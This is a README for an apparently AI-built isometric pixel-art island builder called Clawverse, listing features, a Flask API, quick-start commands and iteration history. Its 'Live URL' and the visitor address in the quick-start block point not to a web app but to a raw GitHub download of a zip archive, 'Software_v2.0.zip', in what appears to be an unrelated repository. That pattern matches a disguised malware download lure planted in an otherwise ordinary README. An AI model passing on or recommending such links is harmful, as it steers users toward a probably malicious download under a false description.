# 🦞 Clawverse v1

A persistent isometric pixel-art island builder — always running, shareable with friends.

**Live URL:** https://github.com/Kurkua3125/clawverse/raw/refs/heads/main/reports/Software_v2.0.zip  
**Backend:** Port 19003  
**Engine:** Flask + SQLite + vanilla JS isometric renderer

---

## Features

### Core
- 🌍 **Isometric world** — 32×32 tile grid with terrain, objects, and Z-layers
- 🎨 **Tile palette** — 50+ terrain tiles and objects (trees, houses, flowers, etc.)
- 📸 **Snapshots** — Save named world versions, restore anytime
- 🎭 **Themes** — Ocean Isle, Tropical, Forest, Winter, Desert
- 📊 **Progress / XP** — Level up by building and receiving visitors
- 🏅 **Achievements** — Unlock badges for milestones

### Owner/Visitor Auth (Marathon 2)
- 🔑 **Owner mode** (localhost) — Full edit rights, world builder
- 👁 **Visitor mode** (external) — Read-only + social actions
- 🚫 Write endpoints protected from external access

### Onboarding (Marathon 2)
- 🪄 **5-step wizard** for new island owners
  - Welcome → Name island → Choose theme → Place first tile → Done!

### Visitor Experience (Marathon 2)
- 🏝 **Welcome overlay** — Island greeting with name/message input
- 💬 **Visitor messages** — Leave a personal note when marking the island
- 🎁 **Gift system** — Leave one gift object per day (placed directly on island)

### AI Features
- 🤖 **AI Layout Assistant** — Describe your vision, AI builds it
  - 6 presets: Cozy Corner, Japanese Garden, Beach Dock, Flower Meadow, Stone Circle, Cozy Village
  - Keyword matching: "japanese garden" → japanese_garden preset
- ✨ **AI Tile Generation** — Describe any tile, gsk generates pixel art

### Real-time (Marathon 2)
- 📡 **SSE events** — Visitors see owner tile placements in real-time
- 👥 **Presence badge** — Live visitor count display
- 💓 **Presence heartbeat** — 30s ping to track active visitors

### Island Story (Marathon 2)
- 📖 **Bio system** — Owner writes island description
- 💬 **Daily message** — Fresh greeting shown to visitors
- 🔄 **Auto-bio** — Generated from world stats if not set

### Social
- 🌸 **Leave marks** — Emoji reactions on islands
- 🗺 **Island registry** — Register and discover other islands
- 🎁 **Gifts** — Visitors leave objects permanently on your island

---

## Quick Start

```bash
# Start the backend
bash /home/azureuser/.openclaw/workspace/skills/clawverse/start.sh

# Or manually
cd /opt/clawverse/backend && python3 app.py > /tmp/clawverse-v1.log 2>&1 &

# Open in browser
# Owner: http://127.0.0.1:19003 (localhost = full edit)
# Visitor: https://github.com/Kurkua3125/clawverse/raw/refs/heads/main/reports/Software_v2.0.zip (external = read-only)
```

---

## Architecture

```
clawverse-v1/
├── frontend/
│   ├── index.html      — Single-file SPA (canvas renderer + UI)
│   └── assets/         — Static assets
├── backend/
│   ├── app.py          — Flask API server (port 19003)
│   ├── db.py           — SQLite persistence layer
│   ├── clawverse.db    — SQLite database
│   └── worlds/
│       └── default.json — Current world state
├── catalog/
│   ├── catalog.json    — Tile/object definitions
│   ├── terrain/        — 128×64 isometric terrain tiles
│   └── objects/        — Object sprites
├── progress/           — Agent progress logs
└── README.md           — This file
```

---

## API Reference

### Auth
| Endpoint | Description |
|----------|-------------|
| `GET /api/auth/mode` | `{mode:"owner"|"visitor", is_owner:bool}` |

### World
| Endpoint | Description |
|----------|-------------|
| `GET /api/world` | Current world JSON |
| `POST /api/world/place` | Place tile (owner only) |
| `POST /api/world/remove` | Remove tile (owner only) |
| `POST /api/world/save` | Save world (owner only) |
| `POST /api/world/reset` | Generate fresh world (owner only) |
| `POST /api/world/rename` | Rename island (owner only) |
| `GET /api/world/stats` | Tile/object counts |
| `GET/POST /api/world/theme` | Get/set theme |
| `POST /api/world/snapshot` | Save named snapshot |
| `GET /api/world/history` | List snapshots |

### Social & Gifts
| Endpoint | Description |
|----------|-------------|
| `POST /api/visit` | Leave emoji mark |
| `GET /api/visits` | Recent visitors |
| `GET /api/gifts` | Gifts on island |
| `POST /api/gifts/leave` | Leave a gift (1/visitor/day) |

### AI Layout
| Endpoint | Description |
|----------|-------------|
| `GET /api/ai/layouts` | List layout presets |
| `POST /api/ai/layout/suggest` | Suggest layout from text |
| `POST /api/ai/layout/apply` | Apply layout (owner only) |

### Story & Onboarding
| Endpoint | Description |
|----------|-------------|
| `GET/POST /api/story` | Island bio/daily message |
| `GET/POST /api/onboarding/status` | Onboarding state |

### Presence & SSE
| Endpoint | Description |
|----------|-------------|
| `GET /api/presence` | Visitor count |
| `POST /api/presence/ping` | Heartbeat |
| `GET /api/events` | SSE real-time stream |

### Progress
| Endpoint | Description |
|----------|-------------|
| `GET /api/progress` | XP, level, achievements |
| `POST /api/progress/event` | Record action |

---

## Development

```bash
# Check backend logs
tail -f /tmp/clawverse-v1.log

# Test API
curl -s http://127.0.0.1:19003/api/status
curl -s http://127.0.0.1:19003/api/auth/mode  # → {mode:"owner"}

# Validate frontend
python3 -c "open('/opt/clawverse/frontend/index.html').read(); print('OK')"

# Reset world
curl -s -X POST http://127.0.0.1:19003/api/world/reset
```

---

## Iteration History

| Iteration | Features |
|-----------|----------|
| **Marathon 1** | Core isometric engine, tile catalog (50+ tiles), AI tile generation, progress/XP/achievements, social marks, island registry, multi-world, snapshots, themes, dashboard |
| **Marathon 2** | Owner/visitor auth, onboarding wizard, visitor welcome+messages, AI layout presets, island story/bio, real-time SSE presence, gift system, visual tile polish, docs |

---

*Built with 🦞 by the Clawverse AI team*
